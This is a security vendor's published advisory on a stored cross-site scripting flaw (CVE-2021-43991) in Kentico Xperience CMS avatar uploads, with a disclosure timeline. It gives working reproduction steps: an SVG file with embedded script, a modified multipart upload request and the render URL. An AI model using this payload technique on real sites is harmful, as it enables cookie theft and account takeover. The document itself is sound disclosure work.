=== Content from appcheck-ng.com_15213023_20250114_205611.html ===

[Skip to content](#content)
[![](https://appcheck-ng.com/wp-content/uploads/2023/06/logo.png)](https://appcheck-ng.com)

* [Home](https://appcheck-ng.com/)
* Services
  + [Web Application Scanning](https://appcheck-ng.com/web-application-scanning/)
  + [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
  + [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
  + [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
  + [Single Page Application Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [Security Blog](https://appcheck-ng.com/security-blog/)
* [Case Studies](https://appcheck-ng.com/case-studies/)
* [Get Help](https://appcheck-ng.com/get-help/)
  + [Documentation](https://appcheck-ng.com/get-help/documentation/)
  + [Downloads](https://appcheck-ng.com/get-help/downloads/)
  + [Contact Support](https://appcheck-ng.com/contact-support/)
* [Become a partner](https://appcheck-ng.com/more/become-a-partner/)
* More
  + [About Us](https://appcheck-ng.com/about-us/)
    - [Our Story](/about-us/)
  + [Careers](https://appcheck-ng.com/more/careers/)
  + [Contact](https://appcheck-ng.com/contact/)
* [Start your free trial](#StartYourFreeTrial)

* [Home](https://appcheck-ng.com/)
* Services
  + [Web Application Scanning](https://appcheck-ng.com/web-application-scanning/)
  + [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
  + [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
  + [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
  + [Single Page Application Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [Security Blog](https://appcheck-ng.com/security-blog/)
* [Case Studies](https://appcheck-ng.com/case-studies/)
* [Get Help](https://appcheck-ng.com/get-help/)
  + [Documentation](https://appcheck-ng.com/get-help/documentation/)
  + [Downloads](https://appcheck-ng.com/get-help/downloads/)
  + [Contact Support](https://appcheck-ng.com/contact-support/)
* [Become a partner](https://appcheck-ng.com/more/become-a-partner/)
* More
  + [About Us](https://appcheck-ng.com/about-us/)
    - [Our Story](/about-us/)
  + [Careers](https://appcheck-ng.com/more/careers/)
  + [Contact](https://appcheck-ng.com/contact/)
* [Start your free trial](#StartYourFreeTrial)

* [Security Alerts](https://appcheck-ng.com/category/security-alerts/)

* September 17, 2021

# Security Advisory: Persistent XSS via Avatar Upload in Kentico CMS (CVE-2021-43991)

The Kentico CMS (13.0.4001.0 Xperience platform version tested locally) is vulnerable to a persistent Cross-Site Scripting (XSS) vulnerability (also known as Stored or Second-Order XSS).

### Vulnerability Summary

The [Kentico](https://www.kentico.com/)  Xperience CMS version 13.0 – 13.0.43 is vulnerable to a persistent [Cross-Site Scripting (XSS)](https://appcheck-ng.com/cross-site-scripting/) vulnerability (also known as Stored or Second-Order XSS).

Persistent XSS vulnerabilities occur when the application stores and retrieves client supplied data without proper handling of dangerous content. This type of XSS vulnerability is exploited by submitting malicious script content to the application which is then retrieved and executed by other application users.

The attacker could exploit this to conduct a range of attacks against users of the affected application such as session hijacking, account take over and accessing sensitive data.

You can read more about XSS here:

<https://appcheck-ng.com/cross-site-scripting/>

### Technical Analysis

For this example, the Dancing Goat sample application that ships with the Kentico Xperience platform trial is used. However, the vulnerability affects many real world Kentico deployments as observed by the AppCheck research team. A proof of concept example was provided to Kentico using one of their public facing applications.

The vulnerability occurs due to the way Avatar images files are stored and retrieved.

Registered users across a range of Kentico powered applications can upload image files to customise the avatar associated with their profile. The uploaded file extension is validated against a list of known good image file types before being accepted. The uploaded image file is then retrieved using a separate endpoint in order to be displayed within the application.

The following application behavior creates an exploitable condition:

**Upload**

a) It is possible to upload a file and set the file *Content-Type*  (mime-type) to any value as long as it beings with “image/”. The supplied *Content-Type* value is stored and returned within the Content-Type header when the file is downloaded. Although the “svg” extension is not permitted, any permitted extension can be used along with a file content-type value of **image/svg+xml** in order to exploit this flaw.

**Render**

b) When accessing the uploaded file directly using its rendering URL, the “Content-Type” and file content used in the upload are returned unchanged. Therefore, it is possible to present any image file type to the browser including SVG.

c) A “Content-Disposition” header is returned when rendering the image, however it is set to “inline” indicating it can be displayed inside the Web page, or as the Web page.

It is possible to exploit this flaw by embedding JavaScript code within an SVG file, when the image is accessed by the target user, the JavaScript executes in the context of the users session with the application.

### Recreating the vulnerability

**Note:** ***To recreate this issue, you will need an intercepting proxy such as Fiddler that is able to replay and modify the image upload (or alternate method of manipulating the content-type value within the multipart boundary as shown).***

**Step 1: Upload the XSS image payload**

First create a file with a .jpg extension with the following content;

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" >
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

Authenticate to the target application and upload the file as your avatar image. Identify the upload request and resend it, this time changing the “Content-Type” within the body (not the http headers) to “**image/svg+xml**”. The following request was used in our environment:

```
POST /kentico13_1_dancinggoatmvc/account/changeavatar/ HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy1EkItbBBRLpNCAg
… Truncated

------WebKitFormBoundaryy1EkItbBBRLpNCAg
Content-Disposition: form-data; name="__RequestVerificationToken"

tcftOraqI42VZK7sT0vJflcHvjXhYyDOMsZz0ClmHN-ay8GAoz5Gsf2rrHWsBbZM0-pWEliBZwQdwOSkGQXPL1rp_Y3aBPI7iZltWLNf0vM_oJgnqJuhoIrJZn0LDh1she06O_YxHa1zKdk1yX1TNg2
------WebKitFormBoundaryy1EkItbBBRLpNCAg
Content-Disposition: form-data; name="avatarUpload"; filename="evil.jpg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" >
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert(document.cookie);
</script>
</svg>

------WebKitFormBoundaryy1EkItbBBRLpNCAg--
```

**Step 2: Render the image to execute the payload**

Once the image file is uploaded, identify the <img> src attribute URL being used to load and display the image to the user. In our lab environment the URL can be found in the following HTML element:

```
<div class="dropdown-desktop">
<img src="/Kentico13_1_DancingGoatMvc/getavatar/f5cf51ae-7206-4514-a191-e48bcec6fec1/avatar.jpg" class="dropdown-desktop-avatar" alt="avatar" />
```

Note that the file segment or the URL can be changed from avatar.jpg to any value. Accessing the URL will demonstrate the issue.

**Screen Shot: Executing alert(document.cookie)**

[![](https://appcheck-ng.com/wp-content/uploads//tmp/cv/Kentico-Screenshot-1.png)](https://appcheck-ng.com/wp-content/uploads//tmp/cv/Kentico-Screenshot-1.png)

**Screen Shot: Proof-of-Concept provided to Kentico.**

[![](https://appcheck-ng.com/wp-content/uploads//tmp/cv/Kentico-Screenshot-3.png)](https://appcheck-ng.com/wp-content/uploads//tmp/cv/Kentico-Screenshot-3.png)

###

### Acknowledgements

AppCheck would like to thank Kentico Software for their speedy response and ease to work with during this process.

Check out their latest hotfixes here: <https://devnet.kentico.com/download/hotfixes>

### Timeline

09/09/2021 – Email report sent to Kentico

13/09/2021 – Report acknowledged

17/09/2021 – Hotfix Released

21/09/2021 – AppCheck advisory published.

### About AppCheck

AppCheck is a software security vendor based in the UK, offering a leading security scanning platform that automates the discovery of security flaws within organisations websites, applications, network, and cloud infrastructure.

As always, if you require any more information on this topic or want to see what unexpected vulnerabilities AppCheck can pick up in your website and applications then please get in contact with us: info@localhost

#### Get started with Appcheck

No software to download or install.

Contact us or call us 0113 887 8380

[Start your free trial](#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjEzOTUiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D)

### Further Reading

* Research

* [June 28, 2023](https://appcheck-ng.com/2023/06/28/)

# [Deep Dive: Logging](https://appcheck-ng.com/deep-dive-logging/)

* Security Alerts

* [December 20, 2024](https://appcheck-ng.com/2024/12/20/)

# [Known Actively Exploited Vulnerabilities Round-up (13.12.24-19.12.24)](https://appcheck-ng.com/known-actively-exploited-vulnerabilities-round-up-13-12-24-19-12-24/)

* Security Alerts

* [December 13, 2024](https://appcheck-ng.com/2024/12/13/)

# [Known Actively Exploited Vulnerabilities Round-up (06.12.24-12.12.24)](https://appcheck-ng.com/known-actively-exploited-vulnerabilities-round-up-06-12-24-12-12-24/)

* Technical Updates

* [December 12, 2024](https://appcheck-ng.com/2024/12/12/)

# [Palo Alto Networks Monthly Security Round-up Nov-Dec 2024](https://appcheck-ng.com/palo-alto-networks-monthly-security-round-up-nov-dec-2024/)

* Security Alerts

* [December 11, 2024](https://appcheck-ng.com/2024/12/11/)

# [Microsoft Patch Tuesday – December 10th 2024](https://appcheck-ng.com/microsoft-patch-tuesday-december-10th-2024/)

* Security Alerts

* [December 6, 2024](https://appcheck-ng.com/2024/12/06/)

# [Known Actively Exploited Vulnerabilities Round-up (29.11.24-05.12.24)](https://appcheck-ng.com/known-actively-exploited-vulnerabilities-round-up-29-11-24-05-12-24/)

* Security Alerts

* [November 29, 2024](https://appcheck-ng.com/2024/11/29/)

# [Known Actively Exploited Vulnerabilities Round-up (22.11.24-28.11.24)](https://appcheck-ng.com/known-actively-exploited-vulnerabilities-round-up-22-11-24-28-11-24/)

![](https://appcheck-ng.com/wp-content/uploads/2024/02/Appcheck_logo_icon.svg)

## About Appcheck

AppCheck is a software security vendor based in the UK, offering a leading security scanning platform that automates the discovery of security flaws within organisations websites, applications, network and cloud infrastructure. AppCheck are authorized by te Common Vulnerabilities and Exposures (CVE) Program aas a CVE Numbering Authority (CNA)

## Put us to the test.Try AppCheck for free

No software to download or install.

Contact us or call us 0113 887 8380

Start your free trial

[![](https://appcheck-ng.com/wp-content/uploads/2023/06/logo.png)](https://appcheck-ng.com)

[![](https://appcheck-ng.com/wp-content/uploads/2023/06/iso_badge.jpg)](https://appcheck-ng.com/wp-content/uploads/2024/11/ISO-27001-_-2013-Certificate-1.pdf)

##### Services

* [Web App Scanning](https://appcheck-ng.com/web-application-scanning/)
* [Single Page App Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
* [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
* [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
* [DAST](https://appcheck-ng.com/dast/)
* [Vulnerability Scanning](https://appcheck-ng.com/vulnerability-scanner/)
* [External Vulnerability Scanner](https://appcheck-ng.com/external-vulnerability-scanning/)
* [Automated Penetration Testing](https://appcheck-ng.com/automated-penetration-testing/)

* [Web App Scanning](https://appcheck-ng.com/web-application-scanning/)
* [Single Page App Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
* [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
* [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
* [DAST](https://appcheck-ng.com/dast/)
* [Vulnerability Scanning](https://appcheck-ng.com/vulnerability-scanner/)
* [External Vulnerability Scanner](https://appcheck-ng.com/external-vulnerability-scanning/)
* [Automated Penetration Testing](https://appcheck-ng.com/automated-penetration-testing/)

##### Company

* [About Us](https://appcheck-ng.com/about-us/)
* [AppCheck Privacy Policy](https://appcheck-ng.com/privacy-policy/)
* [Cookie Policy](https://appcheck-ng.com/cookie-policy/)
* [Compliance Information](https://appcheck-ng.com/compliance/)
* [Existing Customer?](https://scanner.appcheck-ng.com/)

* [About Us](https://appcheck-ng.com/about-us/)
* [AppCheck Privacy Policy](https://appcheck-ng.com/privacy-policy/)
* [Cookie Policy](https://appcheck-ng.com/cookie-policy/)
* [Compliance Information](https://appcheck-ng.com/compliance/)
* [Existing Customer?](https://scanner.appcheck-ng.com/)

##### Resources

* [Brochure](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Brochure.pdf)
* [AppCheck Benefits Overview](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Benefits.pdf)
* [OWASP Top 10](/wp-content/uploads/2023/06/AppCheck_OWASP_Top10_2021.pdf)
* [Sample Report](/wp-content/uploads/2023/06/AppCheck_Sample_Report.pdf)
* [Start Your Trial](#StartYourFreeTrial)

* [Brochure](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Brochure.pdf)
* [AppCheck Benefits Overview](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Benefits.pdf)
* [OWASP Top 10](/wp-content/uploads/2023/06/AppCheck_OWASP_Top10_2021.pdf)
* [Sample Report](/wp-content/uploads/2023/06/AppCheck_Sample_Report.pdf)
* [Start Your Trial](#StartYourFreeTrial)

##### Keep in touch

email

 I agree to receive information and commercial offers about AppCheck Ltd.
 Submit

AppCheck Ltd. is a company registered in England and Wales with company number 06888174

## Start your free trial

Simply complete the form and we’ll send you all you need to activate AppCheck and undertake your FREE scan.

**Your details**
Full Name

Company Name

Work Email

Telephone

Where did you hear about AppCheck?

**IP Addresses**
Please enter your IP address ranges

**URLs**
Please enter full URLs for your web applications, and both http and https where appropriate

 I have read and agreed to our [Privacy Policy](/privacy-policy/)
 I agree to receive information and commercial offers about AppCheck Ltd.

Submit

# Get in touch


